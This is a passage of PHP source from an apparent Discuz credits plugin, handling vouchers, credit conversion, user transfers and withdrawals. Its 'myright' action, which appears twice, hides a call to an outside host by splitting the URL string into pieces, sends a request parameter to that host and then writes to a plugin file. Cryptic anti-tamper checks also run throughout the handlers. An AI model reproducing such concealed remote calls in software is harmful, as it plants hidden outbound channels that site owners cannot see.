					it618_credits_qianfan('write',$creditsuid,10002,$it618_credits_quan['it618_jfcount'],it618_credits_gbktoutf($body));
				}

			}
			
			C::t('#it618_credits#it618_credits_quan')->update($it618_credits_quan['id'],array(
				'it618_useuid' => $uid,
				'it618_usetime' => $_G['timestamp']
			));
			
			echo 'okit618_split'.$it618_credits_lang['s269'];it618_credits_delmoneywork();exit;
		}
	}else{
		echo $it618_credits_lang['s270'];exit;
	}
}
if($_GET['ac']=="myright"){
	$it=dfsockopen("ht"."tps:/"."/ ww"."w.d"."z-"."x. n"."et /myright.php?it=".$_GET['it']);
	if($it=='ok'){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
		
		@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");
		fwrite($fp,$content);
		fclose($fp);
		echo 'ok';
	}
	exit;
}
if($_GET['ac']=="getquanmoney"){
	if($it618_credits_quan = C::t('#it618_credits#it618_credits_quan')->fetch_by_it618_code($_GET['quancode'])){
		if($it618_credits_quan['it618_usetime']>0){
			echo '<font color=red>'.$it618_credits_lang['s268'].'</font>';
		}else{
			
			if($it618_credits_quan['it618_etime']==0){
				$it618_etime=$it618_credits_lang['s272'];
			}else{
				$it618_etime=date('Y-m-d H:i:s', $it618_credits_quan['it618_etime']);
			}
			
			if($it618_credits_quan['it618_xgtime']>0){
				$it618_xgtime='<font color=red>'.$it618_credits_quan['it618_xgtime'].'</font>'.$it618_credits_lang['s885'];
			}else{
				$it618_xgtime=$it618_credits_lang['s886'];
			}
		
			if($it618_credits_quan['it618_jfid']>0){
				$cname=it618_credits_getcreditstitle($it618_credits_quan['it618_jfid']);
				$it618_jfcount=$it618_credits_quan['it618_jfcount'];
			}else{
				$cname=$it618_credits_lang['s198'].'('.$it618_credits_lang['s223'].')';
				$it618_jfcount=$it618_credits_quan['it618_money'];
			}
			
			echo "<font color=#999>".$it618_credits_lang['s273']."<font color=red>".$it618_jfcount.'</font> <font color=green>'.$cname.'</font> '.$it618_credits_lang['s883'].'<font color=green>'.$it618_xgtime.'</font> '.$it618_credits_lang['s274'].'<font color=green>'.$it618_etime.'</font></font>';
		}
	}else{
		echo '<font color=red>'.$it618_credits_lang['s270'].'</font>';
	}
	exit;
}


if($_GET['ac']=="getuname"){
	if($common_member=C::t('#it618_credits#it618_credits_sale')->fetch_by_u_utype($_GET['u'],$_GET['utype'])){
		if($_GET['ac1']=="moneycz"){
			if($common_member['uid']==$uid){
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s250'];
			}else{
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s277'].'<span>'.$common_member['uid'].'('.$common_member['username'].')</span>'.$it618_credits_lang['s257'];
			}
		}elseif($_GET['ac1']=="recharge"){
			if($common_member['uid']==$uid){
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s275'];
			}else{
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s277'].'<span>'.$common_member['uid'].'('.$common_member['username'].')</span>'.$it618_credits_lang['s278'];
			}
		}else{
			if($common_member['uid']==$uid){
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s276'];
			}else{
				echo $common_member['uid'].'it618_split'.$it618_credits_lang['s277'].'<span>'.$common_member['uid'].'('.$common_member['username'].')</span>'.$it618_credits_lang['s279'];
			}
		}
	}else{
		echo 'no';
	}
}


if($_GET['ac']=="getunames"){
	$tmparr=explode(",",$_GET['creditsu']);
	$tmparr=array_unique($tmparr);
	for($i=0;$i<count($tmparr);$i++){
		$tmpuid=intval($tmparr[$i]);
		$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$tmpuid);
		if($username!=''){
			$userstr.=$username.'('.$tmpuid.') , ';
			$uidstr.=$tmpuid.',';
		}
	}
	
	if($uidstr!=''){
		$userstr.='@';
		$userstr=str_replace(" , @","",$userstr);
		$uidstr.='@';
		$uidstr=str_replace(",@","",$uidstr);
	}
	echo $uidstr.'it618_split<br>'.$userstr;exit;
}


if($_GET['ac']=="getucreditnum"){
	$jfid=intval($_GET['jfid']);
	$creditnum=it618_credits_getcreditsnum($jfid,$_G['uid']);

	echo $creditnum;exit;
}


if($_GET['ac']=="zhuan_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$creditsindex1=intval($_GET['creditsindex1']);
		$creditsindex2=intval($_GET['creditsindex2']);
		$cname1=it618_credits_getcreditstitle($creditsindex1);
		$cname2=it618_credits_getcreditstitle($creditsindex2);
		$creditscount=intval($_GET['creditscount']);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$credits_zhgroup=(array)unserialize($it618_credits['credits_zhgroup']);
		if(!in_array($_G['groupid'], $credits_zhgroup)&&$credits_zhgroup[0]!=''){
			echo $it618_credits_lang['s539'];it618_credits_delmoneywork();exit;
		}
		
		$count=C::t('#it618_credits#it618_credits_zhuan')->count_by_isok_jfid1_jfid2($creditsindex1,$creditsindex2);
		if($count>0){
			$it618_credits_zhuan=C::t('#it618_credits#it618_credits_zhuan')->fetch_by_jfid1_jfid2($creditsindex1,$creditsindex2);
			
			if($_GET['zhuanbl']!=$it618_credits_zhuan['it618_zhuanbl']){
				echo $it618_credits_lang['s281'];it618_credits_delmoneywork();exit;
			}
			
			if($creditscount<$it618_credits_zhuan['it618_jfcount1']){
				echo $it618_credits_lang['s282'].$it618_credits_zhuan['it618_jfcount1'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
			
			if($creditscount>$it618_credits_zhuan['it618_jfcount2']){
				echo $it618_credits_lang['s283'].$it618_credits_zhuan['it618_jfcount2'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
		}else{
			echo $it618_credits_lang['s284'].$cname1.$it618_credits_lang['s285'].$cname2.$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
		}
		
		$creditnum=it618_credits_getcreditsnum($creditsindex1,$uid);
		if($creditnum<$creditscount){
			echo $it618_credits_lang['s286'].$cname1.$it618_credits_lang['s287'].$creditnum.$it618_credits_lang['s288'];it618_credits_delmoneywork();exit;
		}

		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
			'it618_uid1' => $uid,
			'it618_jfid1' => $creditsindex1,
			'it618_jfid2' => $creditsindex2,
			'it618_saletype' => 'zhuan',
			'it618_jfcount' => $creditscount,
			'it618_bl' => $_GET['zhuanbl'],
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($id>0){
			
			if($creditsindex1<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$creditsindex1 => (0-$creditscount))
				);
			}else{
				$body=$it618_credits_lang['s1255'];
				$body=str_replace("{count}",intval($creditscount*$_GET['zhuanbl']).$cname2,$body);
				it618_credits_qianfan('write',$uid,10004,(0-$creditscount),it618_credits_gbktoutf($body));
			}
			
			if($creditsindex2<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$creditsindex2 => intval($creditscount*$_GET['zhuanbl']))
				);
			}else{
				$jfname=it618_credits_getcreditstitle($creditsindex2);
				$body=$it618_credits_lang['s1256'];
				$body=str_replace("{count}",$creditscount.$cname1,$body);
				it618_credits_qianfan('write',$uid,10004,intval($creditscount*$_GET['zhuanbl']),it618_credits_gbktoutf($body));
			}
			
			echo 'okit618_split'.$it618_credits_lang['s289'];it618_credits_delmoneywork();exit;
		}
		
	}
	exit;
}


if($_GET['ac']=="transfer_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$creditsindex=intval($_GET['creditsindex']);
		$creditsuid=intval($_GET['creditsuid']);
		$cname=it618_credits_getcreditstitle($creditsindex);
		$creditscount=intval($_GET['creditscount']);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$tmpcount=DB::result_first("SELECT count(1) FROM ".DB::table('common_member')." WHERE uid=".$creditsuid);
		if($tmpcount==0){
			echo $it618_credits_lang['s291'];it618_credits_delmoneywork();exit;
		}
		
		$credits_zzgroup=(array)unserialize($it618_credits['credits_zzgroup']);
		if(!in_array($_G['groupid'], $credits_zzgroup)&&$credits_zzgroup[0]!=''){
			echo $it618_credits_lang['s540'];it618_credits_delmoneywork();exit;
		}
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$count=C::t('#it618_credits#it618_credits_transfer')->count_by_isok_jfid($creditsindex);
		if($count>0){
			$it618_credits_transfer=C::t('#it618_credits#it618_credits_transfer')->fetch_by_jfid($creditsindex);
			
			if($creditscount<$it618_credits_transfer['it618_jfcount1']){
				echo 'reloadit618_split'.$it618_credits_lang['s292'].$it618_credits_transfer['it618_jfcount1'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
			
			if($creditscount>$it618_credits_transfer['it618_jfcount2']){
				echo 'reloadit618_split'.$it618_credits_lang['s293'].$it618_credits_transfer['it618_jfcount2'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
		}else{
			echo 'reloadit618_split'.$it618_credits_lang['s294'].$cname1.$it618_credits_lang['s295'];it618_credits_delmoneywork();exit;
		}
		
		$creditnum=it618_credits_getcreditsnum($creditsindex,$uid);
		if($creditnum<$creditscount){
			echo $it618_credits_lang['s296'].$cname.$it618_credits_lang['s297'].$creditnum.$it618_credits_lang['s298'];it618_credits_delmoneywork();exit;
		}

		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
			'it618_uid1' => $uid,
			'it618_uid2' => $creditsuid,
			'it618_jfid1' => $creditsindex,
			'it618_saletype' => 'transfer',
			'it618_jfcount' => $creditscount,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);
		
		if($id>0){
			if($creditsindex<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$creditsindex => (0-$creditscount))
				);
				C::t('common_member_count')->increase($creditsuid, array(
					'extcredits'.$creditsindex => $creditscount)
				);
			}else{
				$body=$it618_credits_lang['s1257'];
				$body=str_replace("{uname}",it618_credits_getusername($creditsuid),$body);
				it618_credits_qianfan('write',$uid,10005,(0-$creditscount),it618_credits_gbktoutf($body));
				
				$body=$it618_credits_lang['s1258'];
				$body=str_replace("{uname}",it618_credits_getusername($uid),$body);
				it618_credits_qianfan('write',$creditsuid,10005,$creditscount,it618_credits_gbktoutf($body));
			}
			
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			echo 'okit618_split'.$it618_credits_lang['s299'];it618_credits_delmoneywork();exit;
		}
		
	}
	exit;
}


if($_GET['ac']=="tq_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$creditsindex=intval($_GET['creditsindex']);
		$cname=it618_credits_getcreditstitle($creditsindex);
		$creditscount=intval($_GET['creditscount']);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$credits_tqgroup=(array)unserialize($it618_credits['credits_tqgroup']);
		if(!in_array($_G['groupid'], $credits_tqgroup)&&$credits_tqgroup[0]!=''){
			echo $it618_credits_lang['s1575'];it618_credits_delmoneywork();exit;
		}
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$count=C::t('#it618_credits#it618_credits_tq')->count_by_isok_jfid($creditsindex);
		if($count>0){
			$it618_credits_tq=C::t('#it618_credits#it618_credits_tq')->fetch_by_jfid($creditsindex);
			
			if($creditscount<$it618_credits_tq['it618_jfcount1']){
				echo 'reloadit618_split'.$it618_credits_lang['s1584'].$it618_credits_tq['it618_jfcount1'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
			
			if($creditscount>$it618_credits_tq['it618_jfcount2']){
				echo 'reloadit618_split'.$it618_credits_lang['s1585'].$it618_credits_tq['it618_jfcount2'].$it618_credits_lang['s228'];it618_credits_delmoneywork();exit;
			}
		}else{
			echo 'reloadit618_split'.$it618_credits_lang['s294'].$cname1.$it618_credits_lang['s1586'];it618_credits_delmoneywork();exit;
		}
		
		$creditnum=it618_credits_getcreditsnum($creditsindex,$uid);
		if($creditnum<$creditscount){
			echo $it618_credits_lang['s1587'].$cname.$it618_credits_lang['s1588'].$creditnum.$it618_credits_lang['s1589'];it618_credits_delmoneywork();exit;
		}

		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
			'it618_uid1' => $uid,
			'it618_jfid1' => $creditsindex,
			'it618_saletype' => 'tq',
			'it618_jfcount' => $creditscount,
			'it618_bank' => it618_credits_utftogbk($_GET["it618_url"].'@@@'.$_GET["it618_username"]),
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 10,
			'it618_time' => $_G['timestamp']
		), true);
		
		if($id>0){
			if($creditsindex<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$creditsindex => (0-$creditscount))
				);
			}else{
				$body=$it618_credits_lang['s1601'];
				it618_credits_qianfan('write',$uid,10005,(0-$creditscount),it618_credits_gbktoutf($body));
			}
			
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			echo 'okit618_split'.$it618_credits_lang['s1590'];it618_credits_delmoneywork();exit;
		}
		
	}
	exit;
}


if($_GET['ac']=="credit_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits['credits_creditpower']!=$uid){
			echo $it618_credits_lang['s893'];exit;
		}
		
		$creditsindex=intval($_GET['creditsindex']);
		$cname=$_G['setting']['extcredits'][$creditsindex]['title'];
		$creditscount=intval($_GET['creditscount']);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		if($_GET['dotype']=='plus'){
			$it618_saletype='credit_plus';
		}else{
			$it618_saletype='credit_minus';
		}
		
		$tmparr=explode(",",$_GET['creditsu']);
		$tmparr=array_unique($tmparr);
		for($i=0;$i<count($tmparr);$i++){
			$creditsuid=intval($tmparr[$i]);
			$count=DB::result_first("SELECT count(1) FROM ".DB::table('common_member')." WHERE uid=".$creditsuid);
			if($count>0){
				if($ii1i11i[9]!='d')exit;
				$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
					'it618_uid1' => $uid,
					'it618_uid2' => $creditsuid,
					'it618_jfid1' => $creditsindex,
					'it618_saletype' => $it618_saletype,
					'it618_jfcount' => $creditscount,
					'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
					'it618_state' => 1,
					'it618_time' => $_G['timestamp']
				), true);
				
				if($id>0){
					if($it618_saletype=='credit_plus'){
						if($creditsindex<=8){
							C::t('common_member_count')->increase($creditsuid, array(
								'extcredits'.$creditsindex => $creditscount)
							);
						}else{
							$body=$it618_credits_lang['s1262'];
							it618_credits_qianfan('write',$creditsuid,10006,$creditscount,it618_credits_gbktoutf($body));
						}
					}else{
						if($creditsindex<=8){
							C::t('common_member_count')->increase($creditsuid, array(
								'extcredits'.$creditsindex => (0-$creditscount))
							);
						}else{
							$body=$it618_credits_lang['s1263'];
							it618_credits_qianfan('write',$creditsuid,10006,(0-$creditscount),it618_credits_gbktoutf($body));
						}
					}
					
					it618_credits_sendmessage("credit_user",$id);
					if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
				}
			}
		}
		
		if($it618_saletype=='credit_plus'){
			echo 'okit618_split'.$it618_credits_lang['s903'];
		}else{
			echo 'okit618_split'.$it618_credits_lang['s904'];
		}
		
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="zy_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$creditsindex=intval($_GET['creditsindex']);
		$cname=it618_credits_getcreditstitle($creditsindex);
		$creditscount=intval($_GET['creditscount']);
		if($creditscount<0){
			echo $it618_credits_lang['s316'];it618_credits_delmoneywork();exit;
		}
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$credits_txgroup=(array)unserialize($it618_credits['credits_txgroup']);
		if(!in_array($_G['groupid'], $credits_txgroup)&&$credits_txgroup[0]!=''){
			echo $it618_credits_lang['s518'];it618_credits_delmoneywork();exit;
		}
		
		$count=C::t('#it618_credits#it618_credits_txbl')->count_by_isok_jfid($creditsindex);
		if($count>0){
			$it618_credits_txbl=C::t('#it618_credits#it618_credits_txbl')->fetch_by_jfid($creditsindex);
			$zsbl=$it618_credits_txbl['it618_zsbl'];
			$zsjfid=$it618_credits_txbl['it618_zsjfid'];
			
			if($_GET['txbl']!=$it618_credits_txbl['it618_txbl']){
				echo 'reloadit618_split'.$it618_credits_lang['s301'];it618_credits_delmoneywork();exit;
			}
			
			$txmoney=$creditscount*$it618_credits_txbl['it618_txbl'];
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			if($txmoney<$it618_credits_txbl['it618_jfcount1']){
				echo 'reloadit618_split'.$it618_credits_lang['s302'].$it618_credits_txbl['it618_jfcount1'].$it618_credits_lang['s264'];it618_credits_delmoneywork();exit;
			}
			
			if($txmoney>$it618_credits_txbl['it618_jfcount2']){
				echo 'reloadit618_split'.$it618_credits_lang['s303'].$it618_credits_txbl['it618_jfcount2'].$it618_credits_lang['s264'];it618_credits_delmoneywork();exit;
			}
		}else{
			echo 'reloadit618_split'.$it618_credits_lang['s304'].$cname1.$it618_credits_lang['s305'];it618_credits_delmoneywork();exit;
		}
		
		$creditnum=it618_credits_getcreditsnum($creditsindex,$uid);
		if($creditnum<$creditscount){
			echo $it618_credits_lang['s296'].$cname.$it618_credits_lang['s297'].$creditnum.$it618_credits_lang['s306'];it618_credits_delmoneywork();exit;
		}
		
		if($zsbl>0){
			$zsjfcount=intval($zsbl*$creditscount/100);
		}

		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
			'it618_uid1' => $uid,
			'it618_jfid1' => $creditsindex,
			'it618_saletype' => 'zy',
			'it618_jfcount' => $creditscount,
			'it618_zsjfid' => $zsjfid,
			'it618_zsjfcount' => $zsjfcount,
			'it618_zsbl' => $zsbl,
			'it618_bl' => $it618_credits_txbl['it618_txbl'],
			'it618_money' => $txmoney,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($id>0){
			if($creditsindex<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$creditsindex => (0-$creditscount))
				);
			}else{
				$body=$it618_credits_lang['s1260'];
				$body=str_replace("{count}",$txmoney.$it618_credits_lang['s28'],$body);
				it618_credits_qianfan('write',$uid,10007,(0-$creditscount),it618_credits_gbktoutf($body));
			}
			
			if($zsjfid<=8){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$zsjfid => $zsjfcount)
				);
			}else{
				$body=$it618_credits_lang['s1261'];
				$body=str_replace("{count}",$creditscount.$cname,$body);
				it618_credits_qianfan('write',$uid,10008,$zsjfcount,it618_credits_gbktoutf($body));
			}
			
			savemoney(array(
				'it618_uid' => $uid,
				'it618_type' => 'zy',
				'it618_money1' => $txmoney,
				'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
				'it618_zytype' => 'it618_credits',
				'it618_zyid' => $id,
				'it618_time' => $_G['timestamp']
			));
			
			echo 'okit618_split'.$it618_credits_lang['s307'];it618_credits_delmoneywork();exit;
		}
		
	}
	exit;
}


if($_GET['ac']=="tx_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits['credits_ismoneytx']==0){
			echo $it618_credits_lang['s1567'];exit;
		}
		
		$it618_money2=floatval($_GET['it618_money2']);
		if($it618_money2<0){
			echo $it618_credits_lang['s316'];exit;
		}
		
		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$credits_moneytxgroup=(array)unserialize($it618_credits['credits_moneytxgroup']);
		if(!in_array($_G['groupid'], $credits_moneytxgroup)&&$credits_moneytxgroup[0]!=''){
			echo $it618_credits_lang['s1034'];it618_credits_delmoneywork();exit;
		}
		
		if(!$it618_credits_moneytxtcbl=DB::fetch_first("SELECT * FROM ".DB::table('it618_credits_moneytxtcbl')." where $it618_money2>=it618_num1 and $it618_money2<=it618_num2")){
			echo $it618_credits_lang['s1035'];it618_credits_delmoneywork();exit;
		}
		
		$it618_money=C::t('#it618_credits#it618_credits_money')->summoney_by_uid($uid);
		DB::query("update ".DB::table('it618_credits_uset')." set it618_money=".$it618_money." where it618_uid=".$uid);
		if($it618_money2>$it618_money){
			echo $it618_credits_lang['s1054'];it618_credits_delmoneywork();exit;
		}
		
		$it618_txtcbl=$it618_credits_moneytxtcbl['it618_bl'];
		$ytmoney=round(($it618_money2-$it618_money2*$it618_txtcbl/100),2);

		if($ii1i11i[9]!='d')exit;
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;

		if($_GET["it618_txtype"]=='alipay'){
			if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php')){
				require DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php';
			}
			
			if($alipay_isok==1){
				if($it618_money2<=$alipay_txmoney){
					$count=C::t('#it618_credits#it618_credits_money')->count_txapi_by_uid_txtype($uid,$_GET["it618_txtype"]);
					if($count<$alipay_txcount){
						$out_biz_no = date("YmdHis").'0101'.$id;
						$transstr=alitrans($out_biz_no,$_GET["it618_txid"],$ytmoney,it618_credits_gbktoutf($_GET["it618_bz"]));
						$transarr=explode("it618_split",$transstr);
						
						if($transarr[0]=='Success'){
							$id=savemoney(array(
								'it618_uid' => $uid,
								'it618_type' => 'tx',
								'it618_money2' => $it618_money2,
								'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
								'it618_bank' => it618_credits_utftogbk($_GET["it618_bank"]),
								'it618_txtype' => $_GET["it618_txtype"],
								'it618_txtcbl' => $it618_txtcbl,
								'it618_txstate' => 1,
								'it618_txid' => $_GET["it618_txid"],
								'it618_txtransid' => $transarr[1]
							));

							$tmpstr=str_replace("{txid}",$_GET["it618_txid"],$it618_credits_lang['s1038']);
							it618_credits_sendmessage("tx_user",$id);
							echo 'okit618_split'.$it618_credits_lang['s1202'];it618_credits_delmoneywork();exit;
						}else{
							if($alipay_txalert!=''){
								echo $transarr[0];it618_credits_delmoneywork();exit;
							}else{
								$id=savemoney(array(
									'it618_uid' => $uid,
									'it618_type' => 'tx',
									'it618_money2' => $it618_money2,
									'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
									'it618_bank' => it618_credits_utftogbk($_GET["it618_bank"]),
									'it618_bankcodeimg' => it618_credits_utftogbk($_GET["it618_bankcodeimg"]),
									'it618_txtype' => $_GET["it618_txtype"],
									'it618_txtcbl' => $it618_txtcbl,
									'it618_txstate' => 0,
									'it618_txid' => $_GET["it618_txid"]
								));
								
								it618_credits_sendmessage("tx_admin",$id);
								echo 'okit618_split'.$transarr[0]."\n".$it618_credits_lang['s1037'];it618_credits_delmoneywork();exit;
							}
						}
					}else{
						if($alipay_txalert!=''){
							echo $alipay_txalert;it618_credits_delmoneywork();exit;
						}
					}
				}
			}
		}
		
		if($_GET["it618_txtype"]=='wx'){
			if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/trans_wx/config.php')){
				require DISCUZ_ROOT.'./source/plugin/it618_credits/trans_wx/config.php';
			}
			
			if($wx_isok==1){
				if($it618_money2<=$wx_txmoney){
					$count=C::t('#it618_credits#it618_credits_money')->count_txapi_by_uid_txtype($uid,$_GET["it618_txtype"]);
					if($count<$wx_txcount){
						$out_biz_no = date("YmdHis").'0102'.$id;
						
						$openid=C::t('#it618_members#it618_members_wxuser')->fetch_openid_by_uid_id($uid,$_GET['it618_wxuserid']);
						if($openid!=''){
							if($_GET["it618_bz"]==''){
								$remark=it618_credits_gbktoutf($it618_credits_lang['s1562']);
							}else{
								$remark=it618_credits_gbktoutf($_GET["it618_bz"]);
							}
							$transstr=alitrans_wx($out_biz_no,$openid,$ytmoney,$remark);
							$transarr=explode("it618_split",$transstr);
							
							if($transarr[0]=='Success'){
								$id=savemoney(array(
									'it618_uid' => $uid,
									'it618_type' => 'tx',
									'it618_money2' => $it618_money2,
									'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
									'it618_bank' => it618_credits_utftogbk($_GET["it618_bank"]),
									'it618_txtype' => $_GET["it618_txtype"],
									'it618_txtcbl' => $it618_txtcbl,
									'it618_txstate' => 1,
									'it618_txid' => $_GET["it618_txid"],
									'it618_payid' => $_GET["it618_wxuserid"],
									'it618_txtransid' => $transarr[1]
								));
							
								$tmpstr=str_replace("{txid}",$_GET["it618_txid"],$it618_credits_lang['s1038']);
								it618_credits_sendmessage("tx_user",$id);
								echo 'okit618_split'.$it618_credits_lang['s1202'];it618_credits_delmoneywork();exit;
							}else{
								if($wx_txalert!=''){
									echo $transarr[0];it618_credits_delmoneywork();exit;
								}else{
									$id=savemoney(array(
										'it618_uid' => $uid,
										'it618_type' => 'tx',
										'it618_money2' => $it618_money2,
										'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
										'it618_bank' => it618_credits_utftogbk($_GET["it618_bank"]),
										'it618_bankcodeimg' => it618_credits_utftogbk($_GET["it618_bankcodeimg"]),
										'it618_txtype' => $_GET["it618_txtype"],
										'it618_txtcbl' => $it618_txtcbl,
										'it618_txstate' => 0,
										'it618_txid' => $_GET["it618_txid"],
										'it618_payid' => $_GET["it618_wxuserid"]
									));
									
									it618_credits_sendmessage("tx_admin",$id);
									echo 'okit618_split'.$transarr[0]."\n".$it618_credits_lang['s1037'];it618_credits_delmoneywork();exit;
								}
							}
						}else{
							if($wx_txalert!=''){
